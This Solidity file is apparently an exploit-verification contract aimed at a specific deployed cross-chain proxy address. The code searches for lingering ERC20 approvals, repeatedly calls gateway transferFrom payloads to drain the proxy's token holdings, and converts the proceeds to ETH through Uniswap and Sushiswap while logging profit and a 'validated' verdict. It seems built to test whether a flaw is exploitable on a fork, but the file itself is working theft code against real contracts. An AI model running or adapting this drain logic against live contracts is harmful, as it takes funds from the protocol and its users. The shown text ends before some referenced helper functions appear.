// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2RouterLike {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IRubicProxyLike {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function getAvailableRouters() external view returns (address[] memory);
    function fixedCryptoFee() external view returns (uint256);
    function RubicPlatformFee() external view returns (uint256);
    function minTokenAmount(address token) external view returns (uint256);
    function maxTokenAmount(address token) external view returns (uint256);
    function routerCall(BaseCrossChainParams calldata params, address gateway, bytes calldata data) external payable;
}

contract FlawVerifier {
    address internal constant TARGET = 0x3335A88bb18fD3b6824b59Af62b50CE494143333;

    address internal constant WETH = address(uint160(0x00C02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    address internal constant UNISWAP_V2 = address(uint160(0x007a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    address internal constant SUSHISWAP = address(uint160(0x00d9e1CE17f2641F24aE83637ab66a2cca9C378B9F));

    address private _profitToken;
    uint256 private _profitAmount;
    uint256 private _nativeBaseline;
    bool private _executed;
    bool private _validated;
    bool private _staleApprovalObserved;
    string private _path;
    string private _verdict;

    constructor() {
        _path =
            "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance persists -> compromised _gateway later reuses transferFrom(proxy, attacker, amount) to drain proxy-held ERC20 balances -> removing that router/gateway from availableRouters never revokes the old token approval";
        _verdict = "refuted";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;
        _nativeBaseline = address(this).balance;

        address[] memory currentRouters = _currentRouters();
        address[] memory spenderCandidates = _spenderCandidates(currentRouters);
        address[] memory tokens = _candidateTokens();

        _runAmplificationRound(currentRouters, spenderCandidates, tokens);
        _runAmplificationRound(currentRouters, spenderCandidates, tokens);

        uint256 bestScore = _currentScore();
        for (uint256 rounds = 3; rounds <= 6; rounds++) {
            _runAmplificationRound(currentRouters, spenderCandidates, tokens);
            uint256 newScore = _currentScore();
            if (newScore <= bestScore) {
                break;
            }
            bestScore = newScore;
        }

        _syncReportedProfit();

        if (bestScore > 0) {
            _validated = true;
            _verdict = "validated";
            return;
        }

        if (_staleApprovalObserved) {
            _path =
                "Observed stale ERC20 approvals from the proxy to current or historical gateway/router spenders, but this fork did not expose a public attacker-callable spender surface that converted those lingering approvals into net profitable transferFrom(proxy, attacker, amount) drains.";
        } else {
            _path =
                "This fork did not expose a live persisted approval from the proxy to the scanned current-or-historical spender set for the scanned token universe, so the core stale-approval precondition was not established.";
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external view returns (string memory) {
        return _path;
    }

    function validatedOrRefuted() external view returns (string memory) {
        return _verdict;
    }

    function staleApprovalObserved() external view returns (bool) {
        return _staleApprovalObserved;
    }

    function validated() external view returns (bool) {
        return _validated;
    }

    function _runAmplificationRound(
        address[] memory currentRouters,
        address[] memory spenderCandidates,
        address[] memory tokens
    ) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            uint256 proxyBalance = _balanceOf(token, TARGET);
            if (proxyBalance == 0) {
                continue;
            }

            proxyBalance = _drainObservedStaleApprovals(token, proxyBalance, spenderCandidates);
            if (proxyBalance != 0) {
                proxyBalance = _seedFreshApprovalAndDrain(token, proxyBalance, currentRouters);
            }

            if (proxyBalance != 0) {
                proxyBalance = _drainObservedStaleApprovals(token, proxyBalance, spenderCandidates);
            }

            _realizeToken(token);
        }

        _syncReportedProfit();
    }

    function _drainObservedStaleApprovals(
        address token,
        uint256 proxyBalance,
        address[] memory spenderCandidates
    ) internal returns (uint256) {
        for (uint256 i = 0; i < spenderCandidates.length; i++) {
            address spender = spenderCandidates[i];
            if (spender.code.length == 0) {
                continue;
            }

            uint256 approval = _allowance(token, TARGET, spender);
            if (approval == 0) {
                continue;
            }

            _staleApprovalObserved = true;
            uint256 amount = approval < proxyBalance ? approval : proxyBalance;
            if (amount == 0) {
                continue;
            }

            if (_attemptGatewayDrain(spender, token, TARGET, address(this), amount)) {
                proxyBalance = _balanceOf(token, TARGET);
                if (proxyBalance == 0) {
                    return 0;
                }
            }
        }

        return proxyBalance;
    }

    function _seedFreshApprovalAndDrain(
        address token,
        uint256 observedProxyBalance,
        address[] memory currentRouters
    ) internal returns (uint256) {
        if (observedProxyBalance == 0 || address(this).balance == 0 || currentRouters.length == 0) {
            return observedProxyBalance;
        }

        (uint256 fixedFee, uint256 grossAmount, uint256 amountIn) = _seedConfig(token);
        if (grossAmount == 0 || amountIn == 0 || address(this).balance <= fixedFee) {
            return observedProxyBalance;
        }

        if (_sourceToken(token, grossAmount) < grossAmount) {
            return observedProxyBalance;
        }
        if (!_forceApprove(token, TARGET, grossAmount)) {
            return observedProxyBalance;
        }

        if (_trySeedAcrossPairs(token, grossAmount, amountIn, fixedFee, currentRouters)) {
            return _balanceOf(token, TARGET);
        }

        return observedProxyBalance;
    }

    function _seedConfig(address token) internal view returns (uint256 fixedFee, uint256 grossAmount, uint256 amountIn) {
        fixedFee = _readUint(TARGET, bytes4(keccak256("fixedCryptoFee()")));
        grossAmount = IRubicProxyLike(TARGET).minTokenAmount(token);
        if (grossAmount == 0) {
            grossAmount = _defaultSeedAmount(token);
        }
        uint256 maxAmount = IRubicProxyLike(TARGET).maxTokenAmount(token);
        if (maxAmount != 0 && grossAmount > maxAmount) {
            grossAmount = maxAmount;
        }
        uint256 feePpm = IRubicProxyLike(TARGET).RubicPlatformFee();
        amountIn = grossAmount - ((grossAmount * feePpm) / 1e6);
    }

    function _trySeedAcrossPairs(
        address token,
        uint256 grossAmount,
        uint256 amountIn,
        uint256 fixedFee,
        address[] memory currentRouters
    ) internal returns (bool) {
        for (uint256 gatewayIndex = 0; gatewayIndex < currentRouters.length; gatewayIndex++) {
            address gateway = currentRouters[gatewayIndex];
            if (gateway.code.length == 0) {
                continue;
            }

            for (uint256 routerIndex = 0; routerIndex < currentRouters.length; routerIndex++) {
                address router = currentRouters[routerIndex];
                if (router.code.length == 0) {
                    continue;
                }

                if (_trySeedWithRouterAndGateway(router, gateway, token, grossAmount, amountIn, fixedFee)) {
                    _staleApprovalObserved = true;
                    _path =
                        "A user executes routerCall for token T, which sets a max approval from the proxy to an allowlisted gateway. The route succeeds because an allowlisted router publicly forwards a call into that same gateway, causing gateway.transferFrom(proxy, attacker, amountIn). The approval then persists and the compromised gateway reuses the same public spender surface to drain the proxy's remaining balance. Removing the gateway/router from availableRouters later would not revoke the ERC20 approval.";

                    uint256 remaining = _balanceOf(token, TARGET);
                    if (remaining != 0) {
                        _attemptGatewayDrain(gateway, token, TARGET, address(this), remaining);
                    }
                    return true;
                }
            }
        }
        return false;
    }

    function _trySeedWithRouterAndGateway(
        address router,
        address gateway,
        address token,
        uint256 grossAmount,
        uint256 amountIn,
        uint256 fixedFee
    ) internal returns (bool) {
        IRubicProxyLike.BaseCrossChainParams memory params = IRubicProxyLike.BaseCrossChainParams({
            srcInputToken: token,
            srcInputAmount: grossAmount,
            dstChainID: 1,
            dstOutputToken: token,
            dstMinOutputAmount: 0,
            recipient: address(this),
            integrator: address(0),
            router: router
        });

        bytes[14] memory gatewayPayloads = _gatewayPayloads(token, TARGET, address(this), amountIn);

        if (router == gateway) {
            for (uint256 i = 0; i < gatewayPayloads.length; i++) {
                bytes memory directPayload = gatewayPayloads[i];
                if (directPayload.length == 0) {
                    continue;
                }
                if (_tryRouterCall(params, gateway, token, fixedFee, directPayload)) {
                    return true;
                }
            }
        }

        for (uint256 i = 0; i < gatewayPayloads.length; i++) {
            bytes memory gatewayPayload = gatewayPayloads[i];
            if (gatewayPayload.length == 0) {
                continue;
            }

            bytes[10] memory routerPayloads = _routerForwardPayloads(gateway, gatewayPayload);
            for (uint256 j = 0; j < routerPayloads.length; j++) {
                bytes memory routerPayload = routerPayloads[j];
                if (routerPayload.length == 0) {
                    continue;
                }
                if (_tryRouterCall(params, gateway, token, fixedFee, routerPayload)) {
                    return true;
                }
            }
        }

        return false;
    }

    function _tryRouterCall(
        IRubicProxyLike.BaseCrossChainParams memory params,
        address gateway,
        address token,
        uint256 fixedFee,
        bytes memory data
    ) internal returns (bool) {
        uint256 beforeLocal = _balanceOf(token, address(this));
        (bool ok, ) = TARGET.call{value: fixedFee}(
            abi.encodeWithSelector(IRubicProxyLike.routerCall.selector, params, gateway, data)
        );
        uint256 afterLocal = _balanceOf(token, address(this));
        if (!ok || afterLocal <= beforeLocal) {
            return false;
        }

        _recordTokenProfit(token, afterLocal - beforeLocal, _path);
        return true;
    }

    function _attemptGatewayDrain(
        address gateway,
        address token,
        address proxy,
        address attacker,
        uint256 amount
    ) internal returns (bool) {
        bytes[14] memory payloads = _gatewayPayloads(token, proxy, attacker, amount);
        string[14] memory paths;

        paths[0] = "routerCall -> stale max allowance persists -> compromised gateway calls transferFrom(proxy, attacker, amount) directly";
        paths[1] = "routerCall -> stale max allowance persists -> compromised gateway calls pullToken(token, proxy, attacker, amount)";
        paths[2] = "routerCall -> stale max allowance persists -> compromised gateway calls transferFrom(token, proxy, attacker, amount)";
        paths[3] = "routerCall -> stale max allowance persists -> compromised gateway calls transferFrom(proxy, attacker, amount, token)";
        paths[4] = "routerCall -> stale max allowance persists -> compromised gateway calls transferFrom(proxy, attacker, uint160(amount), token)";
        paths[5] = "routerCall -> stale max allowance persists -> compromised gateway executes token.transferFrom(proxy, attacker, amount)";
        paths[6] = "routerCall -> stale max allowance persists -> compromised gateway executes token.transferFrom(proxy, attacker, amount) with value arg";
        paths[7] = "routerCall -> stale max allowance persists -> compromised gateway calls token.transferFrom(proxy, attacker, amount)";
        paths[8] = "routerCall -> stale max allowance persists -> compromised gateway calls token.transferFrom(proxy, attacker, amount) with value arg";
        paths[9] = "routerCall -> stale max allowance persists -> compromised gateway runs token.transferFrom(proxy, attacker, amount)";
        paths[10] = "routerCall -> stale max allowance persists -> compromised gateway runs token.transferFrom(proxy, attacker, amount) with value arg";
        paths[11] = "routerCall -> stale max allowance persists -> compromised gateway execs token.transferFrom(proxy, attacker, amount)";
        paths[12] = "routerCall -> stale max allowance persists -> compromised gateway execs token.transferFrom(proxy, attacker, amount) with value arg";
        paths[13] = "routerCall -> stale max allowance persists -> compromised gateway functionCalls token.transferFrom(proxy, attacker, amount)";

        for (uint256 i = 0; i < payloads.length; i++) {
            bytes memory payload = payloads[i];
            if (payload.length == 0) {
                continue;
            }

            uint256 beforeBalance = _balanceOf(token, address(this));
            (bool ok, ) = gateway.call(payload);
            uint256 afterBalance = _balanceOf(token, address(this));
            if (!ok || afterBalance <= beforeBalance) {
                continue;
            }

            _recordTokenProfit(token, afterBalance - beforeBalance, paths[i]);
            return true;
        }

        return false;
    }

    function _realizeToken(address token) internal {
        uint256 balance = _balanceOf(token, address(this));
        if (balance == 0) {
            return;
        }

        if (token == WETH) {
            IWETHLike(WETH).withdraw(balance);
            _syncReportedProfit();
            return;
        }

        uint256 beforeNative = address(this).balance;
        if (_swapTokenForEth(token, balance, UNISWAP_V2) || _swapTokenForEth(token, balance, SUSHISWAP)) {
            uint256 gained = address(this).balance - beforeNative;
            if (gained > 0) {
                _profitToken = address(0);
                _profitAmount = _currentNativeProfit();
                _validated = true;
                _verdict = "validated";
                return;
            }
        }

        _recordTokenProfit(token, balance, _path);
    }

    function _swapTokenForEth(address token, uint256 amount, address router) internal returns (bool) {
        if (!_forceApprove(token, router, amount)) {
            return false;
        }

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WETH;

        uint256 beforeNative = address(this).balance;
        (bool ok, ) = router.call(
            abi.encodeWithSelector(
                IUniswapV2RouterLike.swapExactTokensForETHSupportingFeeOnTransferTokens.selector,
                amount,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        return ok && address(this).balance > beforeNative;
    }

    function _sourceToken(address token, uint256 desiredAmount) internal returns (uint256) {
        if (token == WETH) {
            uint256 toWrap = desiredAmount;
            if (toWrap > address(this).balance) {
                toWrap = address(this).balance;
            }
            if (toWrap == 0) {
                return 0;
            }
            IWETHLike(WETH).deposit{value: toWrap}();
            return _balanceOf(WETH, address(this));
        }

        if (address(this).balance == 0) {
            return 0;
        }

        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = token;

        uint256 maxSpend = address(this).balance;
        if (maxSpend > 5 ether) {
            maxSpend = 5 ether;
        }

        uint256 beforeBalance = _balanceOf(token, address(this));
        (bool ok, ) = UNISWAP_V2.call{value: maxSpend}(
            abi.encodeWithSignature(
                "swapETHForExactTokens(uint256,address[],address,uint256)",
                desiredAmount,
                path,
                address(this),
                block.timestamp
            )
        );
        if (!ok) {
            (ok, ) = SUSHISWAP.call{value: maxSpend}(
                abi.encodeWithSignature(
                    "swapETHForExactTokens(uint256,address[],address,uint256)",
                    desiredAmount,
                    path,
                    address(this),
                    block.timestamp
                )
            );
        }
        if (!ok) {
            return 0;
        }

        return _balanceOf(token, address(this)) - beforeBalance;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (_callSucceeded(ok, ret)) {
            return true;
        }

        (ok, ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        if (!_callSucceeded(ok, ret)) {
            return false;
        }

        (ok, ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        return _callSucceeded(ok, ret);
    }

    function _recordTokenProfit(address token, uint256 amount, string memory successfulPath) internal {
        if (amount == 0) {
            return;
        }

        uint256 nativeProfit = _currentNativeProfit();
        if (nativeProfit > 0) {
            _profitToken = address(0);
            _profitAmount = nativeProfit;
            _path = successfulPath;
            _validated = true;
            _verdict = "validated";
            return;
        }

        if (token == _profitToken) {
            _profitAmount += amount;
            _path = successfulPath;
            return;
        }

        if (_profitAmount == 0 || amount > _profitAmount) {
            _profitToken = token;
            _profitAmount = amount;
            _path = successfulPath;
        }
    }

    function _syncReportedProfit() internal {
        uint256 nativeProfit = _currentNativeProfit();
        if (nativeProfit > 0) {
            _profitToken = address(0);
            _profitAmount = nativeProfit;
            _validated = true;
            _verdict = "validated";
        }
    }

    function _currentScore() internal view returns (uint256) {
        uint256 nativeProfit = _currentNativeProfit();
        if (nativeProfit > 0) {
            return nativeProfit;
        }
        return _profitAmount;
    }

    function _currentNativeProfit() internal view returns (uint256) {
        uint256 balance = address(this).balance;
        return balance > _nativeBaseline ? balance - _nativeBaseline : 0;
    }

    function _currentRouters() internal view returns (address[] memory merged) {
        address[] memory live = IRubicProxyLike(TARGET).getAvailableRouters();
        address[] memory defaults = new address[](4);
        defaults[0] = address(uint160(0x00663dc15d3c1ac63ff12e45ab68fea3f0a883c251));
        defaults[1] = address(uint160(0x00362fa9d0bca5d19f743db50738345ce2b40ec99f));
        defaults[2] = address(uint160(0x00b9e13785127bffcc3dc970a55f6c7bf0844a3c15));
        defaults[3] = address(uint160(0x0003b7551eb0162c838a10c2437b60d1f5455b9554));

        merged = new address[](live.length + defaults.length);
        uint256 count;

        for (uint256 i = 0; i < live.length; i++) {
            if (!_contains(merged, count, live[i])) {
                merged[count++] = live[i];
            }
        }
        for (uint256 i = 0; i < defaults.length; i++) {
            if (!_contains(merged, count, defaults[i])) {
                merged[count++] = defaults[i];
            }
        }

        assembly {
            mstore(merged, count)
        }
    }

    function _spenderCandidates(address[] memory currentRouters) internal pure returns (address[] memory spenders) {
        address[] memory extras = new address[](12);
        extras[0] = address(uint160(0x001111111254fb6c44bac0bed2854e76f90643097d));
        extras[1] = address(uint160(0x001111111254EEB25477B68fb85Ed929f73A960582));
        extras[2] = address(uint160(0x00Def1C0ded9bec7F1a1670819833240f027b25EfF));
        extras[3] = address(uint160(0x000000000000001ff3684f28c67538d4d072C22734));
        extras[4] = address(uint160(0x00DEF171Fe48CF0115B1d80b88dc8eAB59176FEe57));
        extras[5] = address(uint160(0x00216B4B4Ba9F3e719726886d34a177484278BFcae));
        extras[6] = address(uint160(0x001231DEB6f5749Ef6ce6943a275A1D3E7486F4EaE));
        extras[7] = address(uint160(0x006352a56caadc4F1e25cd6C75970fa768A3304e64));
        extras[8] = address(uint160(0x00765277EebeCA2e31912C9946eAe1021199B39C61));
        extras[9] = address(uint160(0x005427FEFA711EfF984124BFBB1AB6fBf5E3Da1820));
        extras[10] = address(uint160(0x00E592427A0AEce92De3Edee1F18E0157C05861564));
        extras[11] = address(uint160(0x0068b3465833fb72A70ecDF485E0e4C7bD8665Fc45));

        spenders = new address[](currentRouters.length + extras.length);
        uint256 count;
        for (uint256 i = 0; i < currentRouters.length; i++) {
            if (!_contains(spenders, count, currentRouters[i])) {
                spenders[count++] = currentRouters[i];
            }
        }
        for (uint256 i = 0; i < extras.length; i++) {
            if (!_contains(spenders, count, extras[i])) {
                spenders[count++] = extras[i];
            }
        }

        assembly {
            mstore(spenders, count)
        }
    }

